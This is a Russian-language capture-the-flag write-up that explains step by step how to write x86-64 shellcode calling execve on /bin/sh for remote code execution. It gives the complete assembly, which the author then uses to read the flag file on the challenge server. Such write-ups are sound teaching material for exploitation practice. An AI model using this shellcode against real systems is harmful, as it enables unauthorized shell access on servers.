Забиваем на ридми, он для детей, задача ясна: написать шеллкод. Пошли писать.

Чтобы получить RCE, надо вызвать /bin/sh на удаленном сервере. Делается это с помощью call execve. Зайдем на [сайтик](https://filippo.io/linux-syscall-table/) и посмотрим, под каким номером находится execve. Стыдно не знать, что это номер 59. Дальше нужно разобраться с тем, как вызывать syscall. А он просто делает колл того, что находится в регистре `rax`. Теперь на том же сайтике посмотрим, как правильно вызывать execve. 

![image](/resourses/pwn1.png)

Видим, что в rdi надо положить указатель на строку с именем файла, а в rsi и в rdx можно положить нули, там дурость какая то. 

Погнали писать. Кладем в rax 59: `mov rax, 59`. В rsi и в rdx кладем 0: `mov rsi, 0` `mov rdx, 0`. А вот с указателем на строку немного сложнее. Сделать это можно через стек. Для начала запакуем строку /bin/sh\x00 в число (обратите внимание на 0 байт в конце строки. Он нужен, чтобы указатель на строку понимал, когда строка заканчивается). Ах как хорошо, что это ровно 8 байт и не надо париться. Заходим в питон:

```python
from pwn import *

print(u64(b'/bin/sh\x00'))
```
Получаем число 29400045130965551. Его кладем в какой нибудь левый регистр, например rcx: `mov rcx, 29400045130965551`. Дальше кладем его на стек: `push rcx`. А дальше кладем в регистр rdi, который должен иметь указатель на строку, указатель на стек. Он всегда расположен в регистре rsp: `mov rdi, rsp`. Теперь можно вызывать syscall. Полный код ниже:

```asm
[section .text]

global _start

_start:
	mov rax, 59
	mov rsi, 0
	mov rdx, 0
	mov rcx, 29400045130965551
	push rcx
	mov rdi, rsp
	syscall
```

Компилируем его с помощью скрипта, который нам любезно положили в архив, выполняем e.py и получаем RCE. Пишем `ls`, видим, что там есть flag.txt. Пишем `cat flag.txt` и получаем флаг.
